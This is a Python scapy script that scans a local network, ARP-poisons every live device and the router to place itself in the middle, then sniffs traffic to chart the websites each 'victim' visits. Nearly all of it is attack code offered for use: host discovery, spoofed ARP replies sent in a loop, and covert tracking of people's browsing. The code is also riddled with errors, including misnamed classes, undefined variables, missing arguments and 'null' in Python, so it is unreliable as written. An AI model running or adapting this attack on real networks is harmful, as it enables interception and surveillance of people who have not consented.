# This code finds all live devices on a network and preforms a MITM on all devices.
# The code preforms basic analysis on all receiving packages.
# IP forwarding must be enabled for optimal results.
# The code was written by Ruben Verhaegh and Milo Grillo (05-04-2019).

from scapy.all import *
import socket
import matplotlib.pyplot as plt

# The Victim class
class Victim():
	def __init__(self, IPaddress):
		self.IP = IPaddress
		self.MAC = ""
		self.websites = []
		
	def get_IP(self):
		return self.IP
		
	# We receive a package from a website, i.e. we add one to the visit count of the website or we add the website to our website list
	def visit_website(self, domain):
		n = len(self.websites)
		for i in range(0, n):
			website = self.websites[i]
			if website.get_domain() == domain:
				website.visit()
				return	
		self.websites.append(Website(domain))
		return
		
	def make_Graph(self):
		plt.figure()
		domains = [self.websites[i].get_domain for i in range(0, len(self.websites))]
		num_Visits = [self.websites[i].visits for i in range(0, len(self.websites))]
		plt.barh(domains, num_Visits) #plots a horizontal bar plot
		plt.suptitle("Websites visited by "+ self.IPaddress)
		plt.show()
		return

# The Website class
class Website():
	def __init__(self, domain):
		self.domain = domain
		self.visits = 1
		
	def get_domain(self):
		return domain
		
	def visit():
		visits += 1
		return

# Contains all functions to be done before the attack preperation, i.e. finding all ip addresses
class PrePreAttack(object):	
	def get_IP_Addrs(self, routerIP):
		num_Array = routerIP.split('.')
		arp_List = ".".join(num_Array[0:3])+".*" #this is to get the string in form "X.X.X.*"
		ans, unans = arping(arp_List) #send a ping to all potential live hosts to find who is live
		n = len(ans)
		victims = []
		for i in range(0, n):
			victims.append(Victim(ans[i][1].psrc))
		return victims #return a list of victims from Victim class.

# Contains all function of the attack preperation
class PreAttack(object):
	def __init__(self, target, interface):
		self.target = target
		self.interface = interface
	def get_MAC_Addr(self): #returns the mac address of a target
		return srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.target.IP),timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc

# Contains the attack functions
class Attack(object):
	def __init__(self, routerip, routermac, targets, interface):
		self.routerip = routerip
		self.routermac = routermac
		self.targets = targets 
		self.interface = interface
	def send_Poison(self, my_Mac):
		for i in range(0, len(targets)):
			#arp to spoof the victim, send to router
			arp1 = Ether() / ARP()
			arp1[Ether].src = my_Mac #attacking MAC address
			arp1[ARP].hwsrc = my_Mac #attacking MAC address
			arp1[ARP].psrc = self.targets[i].IP #IP to Spoof
			arp1[ARP].hwdst = self.routermac
			arp1[ARP].pdst = self.routerip
			sendp(arp1, iface = self.interface)
			#arp to spoof the router, send to victim
			arp2 = Ether() / ARP()
			arp2[Ether].src = my_Mac #attacking MAC address
			arp2[ARP].hwsrc = my_Mac #attacking MAC address
			arp2[ARP].psrc = self.routerip #IP to Spoof
			arp2[ARP].hwdst = self.targets[i].MAC
			arp2[ARP].pdst = self.targets[i].IP
			sendp(arp2, iface = self.interface)
		return

# Contains the analysis and graph functions
class PostAttack():
	def __init__(self, targets):
		self.targets=targets
	def track_packet(self, packet):
		
		source = packet.src
		dest   = packet.dst
		
		for i in range (0, len(self.targets)): #loop over all victims to find a match of IP between the package and any of the victims
			if self.targets[i].get_IP == src:
				try: #try is necessary, as socket.gethostbyaddr may not return a proper host if it seems unavailable
					self.targets[i].visit_website(socket.gethostbyaddr(dest))
				except Exception:
					self.targets[i].visit_website(dest)
				return
			if self.targets[i].get_IP == dest:
				try:
					self.targets[i].visit_website(socket.gethostbyaddr(src))
				except Exception:
					self.targets[i].visit_website(src)
				return
		return
				 
	def make_Graphs():
		allWebsites = {} #To make the big graph, we first have to combine all results. This is done in a dictionary.
		for i in range(0, len(self.targets)):
			self.targets[i].make_Graph()
			for j in range(0, len(self.targets[i].websites)):
				 if self.targets[i].websites[j].domain in allWebsites.keys():
				 	allWebsites[self.targets[i].websites[j]] = self.target[i].websites[j].visits + allWebsites[self.targets[i].websites[j]] 
				 else: 
				 	allWebsites.update({self.targets[i].websites[j]: self.targets[i].websites[j].visits})
		domains = list(allWebsites.keys())
		numVisits = list(allWebsites.values())
		plt.figure()
		plt.barh(domains, numVisits) #plots a horizontal bar plot
		plt.suptitle("Websites visited by " + len(self.targets) + " users.")
		plt.show()
		return

if __name__ == '__main__':
	try:
		interface = "Wi-Fi" #interface, can be different on other devices but is generally "Wi-Fi"
		my_Mac_Addr = get_if_hwaddr(interface) # returns my own MAC address
		IP_router = sr1(IP(dst = "www.wikipedia.org", ttl = 0)/ICMP()) #ttl = 0 to find the router with whom we connected
		targets = PrePreAttack().get_IP_Addrs(IP_router.src)
		try:
			MAC_router = PreAttack(IP_router.src).get_MAC_Addr()
			for i in range(0, len(targets)):
				targets[i].MAC=PreAttack(targets[i].IP, interface).get_MAC_Addr()
		except Exception:
			print("[Cannot find MAC addresses]")

		while True:
			try:
				Attacks(IP_router.src, MAC_router, targets, interface).send_Poison(my_Mac_Addr) # we attack the victims
				sniff(filter="tls", prn=PostAttack(targets).track_packet, timeout=3) # we catch TLS-packages for a duraction of 3 seconds
				# all catched packages are used as argument for the track_packet function as soon as the packet arrives
			except Exception:
				print("[Failed to send ARP-Poison]")
	except KeyboardInterrupt: # Whenever we have a keyboard interrupt, we stop the program
		print("[KeyBoard Interrupt]")
		if targets != null: #This is to ensure graphs can be made.
			print("[Making Graphs]")
			PostAttack(targets).make_Graphs()
		print("[Shutting down]")
